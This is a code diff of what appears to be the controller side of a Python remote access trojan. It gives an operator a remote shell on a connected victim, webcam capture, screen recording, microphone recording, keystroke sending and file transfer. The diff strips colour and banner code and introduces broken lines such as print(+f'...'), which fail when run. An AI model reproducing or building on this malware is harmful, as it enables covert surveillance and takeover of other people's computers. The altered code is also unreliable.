@@ -4,12 +4,8 @@ import os
 import struct
 import pickle
 import cv2
-import threading
 import wave
 import pyaudio
-import pyfiglet
-import random
-from colorama import Fore
 import sys
 
 try:
@@ -20,7 +16,7 @@ try:
     koneksi = soc.accept()
     _target = koneksi[0]
     ip = koneksi[1]
-    print(Fore.CYAN+f'Connected to {str(ip)}')
+    print(+f'Connected to {str(ip)}')
 except KeyboardInterrupt:
     print('exiting listener')
     sys.exit()
@@ -41,9 +37,9 @@ def start_image_server(host="0.0.0.0", port=9993, save_as="hasil.jpg"):
         server.bind((host, port))
         server.listen(1)
 
-        print(Fore.BLUE+"connecting")
+        print("connecting")
         conn, addr = server.accept()
-        print(Fore.RED+f"connected {addr}")
+        print(f"connected {addr}")
 
         size_data = conn.recv(4)
         size = struct.unpack("!I", size_data)[0]
@@ -58,7 +54,7 @@ def start_image_server(host="0.0.0.0", port=9993, save_as="hasil.jpg"):
         with open(save_as, "wb") as f:
             f.write(data)
 
-        print(Fore.BLUE+f'saved as {save_as}')
+        print(f'saved as {save_as}')
 
         conn.close()
         server.close()
@@ -70,15 +66,15 @@ def keystroke():
      with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
           s.bind(('0.0.0.0', 9995))
           s.listen(1)
-          print(Fore.GREEN+'Connect')
+          print('Connect')
           conn, addr= s.accept()
           with conn:
-               print(Fore.CYAN+f'connected {addr}')
+               print(+f'connected {addr}')
                while True:
                     command = input('text: ')
                     conn.sendall(command.encode())
                     break
-     print(Fore.GREEN+'send')
+     print('send')
 
 FORMAT = pyaudio.paInt16
 CHANNELS = 1
@@ -93,13 +89,13 @@ def receive_and_save():
                s.listen(1)
                conn, addr = s.accept()
                with conn:
-                    print(Fore.GREEN+f'connect {addr}')
+                    print(f'connect {addr}')
                     while True:
                          data = conn.recv(CHUNK)
                          if not data:
                               break
                          frames.append(data)
-          print(Fore.CYAN+'saving WAV file')
+          print(+'saving WAV file')
           WAVE_OUTPUT = 'retrieved_audio.wav'
           with wave.open(WAVE_OUTPUT, 'wb') as wf:
                wf.setnchannels(CHANNELS)
@@ -205,7 +201,7 @@ def upload_file(namafile):
      bufsize = 65536
      if not os.path.exists(namafile):
           _target.sendall(struct.pack("Q", 0))
-          print(Fore.RED+'file not found')
+          print('file not found')
           return
      filesize = os.path.getsize(namafile)
      _target.sendall(struct.pack("Q", filesize))
@@ -221,7 +217,7 @@ def download_file(namafile):
      size_data = _target.recv(8)
      filesize = struct.unpack("Q", size_data)[0]
      if filesize == 0:
-          print(Fore.RED+'file not found')
+          print('file not found')
           return 
      recv = 0
      with open(namafile, 'wb') as file:
@@ -244,10 +240,10 @@ def data_diterima():
 def shellc():
     x = 0                      
     n = 0
-    print(Fore.BLUE+"Type 'help' for help")
+    print("Type 'help' for help")
     while True:
         try:
-          perintah = input(Fore.GREEN+'shell> ')
+          perintah = input('shell> ')
           data = json.dumps(perintah)
           _target.send(data.encode())
           if perintah in('exit','quit'):
@@ -278,7 +274,7 @@ def shellc():
           elif perintah == 'screen_share':
               screen_record(host='0.0.0.0', port=9991) 
           elif perintah == 'help':
-             print(Fore.BLUE+"""
+             print("""
                    
                       basic command:
                    ================================
@@ -344,10 +340,6 @@ def shellc():
                    """)
           elif perintah == 'rec_audio':
              receive_and_save()
-          elif perintah == 'banner':
-             list_banner = [pyfiglet.figlet_format('SHELL', font='slant'), pyfiglet.figlet_format('SHELL', font='3-d'), pyfiglet.figlet_format('SHELL', font='standard'), pyfiglet.figlet_format('SHELL', font='banner')]
-             choice = random.choice(list_banner)
-             print(choice)
           elif perintah == 'send_key':
              keystroke()   
           elif perintah == 'snap_cam':
